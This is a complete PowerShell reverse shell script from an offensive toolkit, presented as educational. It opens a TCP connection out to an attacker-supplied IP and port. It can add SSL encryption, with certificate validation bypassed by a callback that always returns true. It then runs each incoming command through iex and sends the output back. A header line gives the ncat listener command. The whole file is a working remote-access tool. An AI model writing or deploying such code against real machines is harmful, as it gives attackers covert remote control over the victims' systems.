<#
  Robust PowerShell reverse shell that can support SSL encryption via Self-Signed Certificates
  ARBITRARY VERSION NUMBER:  1.0.0
  AUTHOR:  Tyler McCann (@tylerdotrar)
  LINK: https://github.com/tylerdotrar/PoorMansArmory


  Notes:
  [+] This script is intended for educational purposes and is intentionally verbose.
  [+] Listener should use ncat for SSL support (e.g., 'rlwrap ncat --ssl -nlvp <port>')
#>


# Parameters
$IPAddress = '<ip_address>'
$Port      = '<listening_port>'
$SSL       = $TRUE


# Establish a TCP client connection to the attacker's IP and port
$RevShellClient = New-Object -TypeName System.Net.Sockets.TcpClient($IPAddress,$Port)

# Get the network stream for sending and receiving encrypted data via SSL
if ($SSL) {
    $CertificateBypass = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object ojb, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static SslStream Stream(TcpClient client)
    {
        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);
    }
}
'@
    Add-Type $CertificateBypass
    $Stream = [SelfSignedCerts]::Stream($RevShellClient)
    $Stream.AuthenticateAsClient('')
}

# Get the network stream for sending and receiving unencrypted data
else { $Stream = $RevShellClient.GetStream() }

# Initialize a buffer for data transmission
[byte[]]$DataBuffer = 0..65535 | % {0}

# Create a StringWriter to capture command output
$OutputBuffer = New-Object -TypeName System.IO.StringWriter

# Redirect console output to the StringWriter
[System.Console]::SetOut($OutputBuffer)

# Main loop for reading and executing commands
while (($BytesRead = $Stream.Read($DataBuffer,0,$DataBuffer.Length)) -ne 0) {

    Try {
        # Convert received data to a command string
        $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($DataBuffer,0,$BytesRead)

        # Execute the command and capture the output
        $CommandOutput = (iex $Command 2>&1 | Out-String)
    } 
    # Capture and format any errors
    Catch {$CommandOutput = "$($Error[0])`n"}

    # Write the command output to the StringWriter
    $OutputBuffer.Write($CommandOutput)

    # Prepare the output string with prompt
    $PromptString = $OutputBuffer.ToString() + 'PS ' + (PWD).Path + '> '

    # Convert the output string to bytes and send it back
    $PromptBytes = ([Text.Encoding]::ASCII).GetBytes($PromptString)
    $Stream.Write($PromptBytes,0,$PromptBytes.Length)
    $Stream.Flush()

    # Clear the StringWriter buffer
    $OutputBuffer.GetStringBuilder().Clear() | Out-Null
}

# Close the StringWriter and TCP client
$OutputBuffer.Close()
$RevShellClient.Close()